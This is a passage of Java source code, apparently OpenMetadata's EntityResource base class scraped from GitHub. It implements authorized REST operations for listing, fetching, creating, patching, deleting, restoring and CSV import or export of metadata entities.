 protected EntityResource(String entityType, Authorizer authorizer) { this.entityType = entityType; this.repository = (K) Entity.getEntityRepository(entityType); this.entityClass = (Class<T>) Entity.getEntityClassFromType(entityType); allowedFields = repository.getAllowedFields(); this.authorizer = authorizer; addViewOperation("owner,followers,votes,tags,extension,domain,dataProducts,experts", VIEW\_BASIC); Entity.registerResourcePermissions(entityType, getEntitySpecificOperations()); }
 /\*\* Method used for initializing a resource, such as creating default policies, roles, etc. \*/ public void initialize(OpenMetadataApplicationConfig config) throws IOException {}
 /\*\* \* Method used for upgrading a resource such as adding new fields to entities, etc. that can't be done in bootstrap \* migrate \*/ public void upgrade() { // Nothing to do in the default implementation }
 public final Fields getFields(String fields) { return repository.getFields(fields); }
 protected T addHref(UriInfo uriInfo, T entity) { Entity.withHref(uriInfo, entity.getOwner()); Entity.withHref(uriInfo, entity.getFollowers()); Entity.withHref(uriInfo, entity.getExperts()); Entity.withHref(uriInfo, entity.getReviewers()); Entity.withHref(uriInfo, entity.getChildren()); Entity.withHref(uriInfo, entity.getDomain()); Entity.withHref(uriInfo, entity.getDataProducts()); return entity; }
 protected List<MetadataOperation> getEntitySpecificOperations() { return null; }
 public final ResultList<T> addHref(UriInfo uriInfo, ResultList<T> list) { listOrEmpty(list.getData()).forEach(i -> addHref(uriInfo, i)); return list; }
 public ResultList<T> listInternal( UriInfo uriInfo, SecurityContext securityContext, String fieldsParam, ListFilter filter, int limitParam, String before, String after) { Fields fields = getFields(fieldsParam); OperationContext listOperationContext = new OperationContext(entityType, getViewOperations(fields)); return listInternal( uriInfo, securityContext, fields, filter, limitParam, before, after, listOperationContext, getResourceContext()); }
 public ResultList<T> listInternal( UriInfo uriInfo, SecurityContext securityContext, Fields fields, ListFilter filter, int limitParam, String before, String after, OperationContext operationContext, ResourceContextInterface resourceContext) { RestUtil.validateCursors(before, after); authorizer.authorize(securityContext, operationContext, resourceContext);
 ResultList<T> resultList; if (before != null) { // Reverse paging resultList = repository.listBefore(uriInfo, fields, filter, limitParam, before); } else { // Forward paging or first page resultList = repository.listAfter(uriInfo, fields, filter, limitParam, after); } return addHref(uriInfo, resultList); }
 public T getInternal(UriInfo uriInfo, SecurityContext securityContext, UUID id, String fieldsParam, Include include) { Fields fields = getFields(fieldsParam); OperationContext operationContext = new OperationContext(entityType, getViewOperations(fields)); return getInternal(uriInfo, securityContext, id, fields, include, operationContext, getResourceContextById(id)); }
 public T getInternal( UriInfo uriInfo, SecurityContext securityContext, UUID id, Fields fields, Include include, OperationContext operationContext, ResourceContextInterface resourceContext) { authorizer.authorize(securityContext, operationContext, resourceContext); return addHref(uriInfo, repository.get(uriInfo, id, fields, include, false)); }
 public T getVersionInternal(SecurityContext securityContext, UUID id, String version) { OperationContext operationContext = new OperationContext(entityType, MetadataOperation.VIEW\_BASIC); return getVersionInternal(securityContext, id, version, operationContext, getResourceContextById(id)); }
 public T getVersionInternal( SecurityContext securityContext, UUID id, String version, OperationContext operationContext, ResourceContextInterface resourceContext) { authorizer.authorize(securityContext, operationContext, resourceContext); return repository.getVersion(id, version); }
 protected EntityHistory listVersionsInternal(SecurityContext securityContext, UUID id) { OperationContext operationContext = new OperationContext(entityType, MetadataOperation.VIEW\_BASIC); return listVersionsInternal(securityContext, id, operationContext, getResourceContextById(id)); }
 protected EntityHistory listVersionsInternal( SecurityContext securityContext, UUID id, OperationContext operationContext, ResourceContextInterface resourceContext) { authorizer.authorize(securityContext, operationContext, resourceContext); return repository.listVersions(id); }
 public T getByNameInternal( UriInfo uriInfo, SecurityContext securityContext, String name, String fieldsParam, Include include) { Fields fields = getFields(fieldsParam); OperationContext operationContext = new OperationContext(entityType, getViewOperations(fields)); return getByNameInternal( uriInfo, securityContext, name, fields, include, operationContext, getResourceContextByName(name)); }
 public T getByNameInternal( UriInfo uriInfo, SecurityContext securityContext, String name, Fields fields, Include include, OperationContext operationContext, ResourceContextInterface resourceContext) { authorizer.authorize(securityContext, operationContext, resourceContext); return addHref(uriInfo, repository.getByName(uriInfo, name, fields, include, false)); }
 public Response create(UriInfo uriInfo, SecurityContext securityContext, T entity) { OperationContext operationContext = new OperationContext(entityType, CREATE); CreateResourceContext<T> createResourceContext = new CreateResourceContext<>(entityType, entity); authorizer.authorize(securityContext, operationContext, createResourceContext); entity = addHref(uriInfo, repository.create(uriInfo, entity)); return Response.created(entity.getHref()).entity(entity).build(); }
 public Response createOrUpdate(UriInfo uriInfo, SecurityContext securityContext, T entity) { repository.prepareInternal(entity, true);
 // If entity does not exist, this is a create operation, else update operation ResourceContext<T> resourceContext = getResourceContextByName(entity.getFullyQualifiedName()); MetadataOperation operation = createOrUpdateOperation(resourceContext); OperationContext operationContext = new OperationContext(entityType, operation); if (operation == CREATE) { CreateResourceContext<T> createResourceContext = new CreateResourceContext<>(entityType, entity); authorizer.authorize(securityContext, operationContext, createResourceContext); entity = addHref(uriInfo, repository.create(uriInfo, entity)); return new PutResponse<>(Response.Status.CREATED, entity, RestUtil.ENTITY\_CREATED).toResponse(); } authorizer.authorize(securityContext, operationContext, resourceContext); PutResponse<T> response = repository.createOrUpdate(uriInfo, entity); addHref(uriInfo, response.getEntity()); return response.toResponse(); }
 public Response patchInternal(UriInfo uriInfo, SecurityContext securityContext, UUID id, JsonPatch patch) { OperationContext operationContext = new OperationContext(entityType, patch); authorizer.authorize(securityContext, operationContext, getResourceContextById(id)); PatchResponse<T> response = repository.patch(uriInfo, id, securityContext.getUserPrincipal().getName(), patch); addHref(uriInfo, response.getEntity()); return response.toResponse(); }
 public Response delete( UriInfo uriInfo, SecurityContext securityContext, UUID id, boolean recursive, boolean hardDelete) { OperationContext operationContext = new OperationContext(entityType, MetadataOperation.DELETE); authorizer.authorize(securityContext, operationContext, getResourceContextById(id)); DeleteResponse<T> response = repository.delete(securityContext.getUserPrincipal().getName(), id, recursive, hardDelete); repository.deleteFromSearch(response.getEntity(), response.getChangeType()); addHref(uriInfo, response.getEntity()); return response.toResponse(); }
 public Response deleteByName( UriInfo uriInfo, SecurityContext securityContext, String name, boolean recursive, boolean hardDelete) { OperationContext operationContext = new OperationContext(entityType, MetadataOperation.DELETE); authorizer.authorize(securityContext, operationContext, getResourceContextByName(name)); DeleteResponse<T> response = repository.deleteByName(securityContext.getUserPrincipal().getName(), name, recursive, hardDelete); repository.deleteFromSearch(response.getEntity(), response.getChangeType()); addHref(uriInfo, response.getEntity()); return response.toResponse(); }
 public Response restoreEntity(UriInfo uriInfo, SecurityContext securityContext, UUID id) { OperationContext operationContext = new OperationContext(entityType, MetadataOperation.EDIT\_ALL); authorizer.authorize(securityContext, operationContext, getResourceContextById(id)); PutResponse<T> response = repository.restoreEntity(securityContext.getUserPrincipal().getName(), entityType, id); repository.restoreFromSearch(response.getEntity()); addHref(uriInfo, response.getEntity()); LOG.info("Restored {}:{}", Entity.getEntityTypeFromObject(response.getEntity()), response.getEntity().getId()); return response.toResponse(); }
 public String exportCsvInternal(SecurityContext securityContext, String name) throws IOException { OperationContext operationContext = new OperationContext(entityType, MetadataOperation.VIEW\_ALL); authorizer.authorize(securityContext, operationContext, getResourceContextByName(name)); return repository.exportToCsv(name, securityContext.getUserPrincipal().getName()); }
 protected CsvImportResult importCsvInternal(SecurityContext securityContext, String name, String csv, boolean dryRun) throws IOException { OperationContext operationContext = new OperationContext(entityType, MetadataOperation.EDIT\_ALL); authorizer.authorize(securityContext, operationContext, getResourceContextByName(name)); return repository.importFromCsv(name, csv, dryRun, securityContext.getUserPrincipal().getName()); }
 protected ResourceContext<T> getResourceContext() { return new ResourceContext<>(entityType); }
 protected ResourceContext<T> getResourceContextById(UUID id) { return new ResourceContext<>(entityType, id, null); }
 protected ResourceContext<T> getResourceContextByName(String name) { return new ResourceContext<>(entityType, null, name); }
 protected static final MetadataOperation[] VIEW\_ALL\_OPERATIONS = {MetadataOperation.VIEW\_ALL}; protected static final MetadataOperation[] VIEW\_BASIC\_OPERATIONS = {MetadataOperation.VIEW\_BASIC};
 private MetadataOperation[] getViewOperations(Fields fields) { if (fields.getFieldList().isEmpty()) { return VIEW\_BASIC\_OPERATIONS; } Set<MetadataOperation> viewOperations = new TreeSet<>(); for (String field : fields.getFieldList()) { MetadataOperation operation = fieldsToViewOperations.get(field); if (operation == null) { return VIEW\_ALL\_OPERATIONS; } viewOperations.add(operation); } return viewOperations.toArray(new MetadataOperation[0]); }
 protected EntityReference getEntityReference(String entityType, String fqn) { return EntityUtil.getEntityReference(entityType, fqn); }
 protected static List<EntityReference> getEntityReferences(String entityType, List<String> fqns) { if (nullOrEmpty(fqns)) { return null; } return EntityUtil.getEntityReferences(entityType, fqns); }
 protected void addViewOperation(String fieldsParam, MetadataOperation operation) { String[] fields = fieldsParam.replace(" ", "").split(","); for (String field : fields) { if (allowedFields.contains(field)) { fieldsToViewOperations.put(field, operation); } else if (!"owner,followers,votes,tags,extension,domain,dataProducts,experts".contains(field)) { // Some common fields for all the entities might be missing. Ignore it. throw new IllegalArgumentException(CatalogExceptionMessage.invalidField(field)); } } }}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


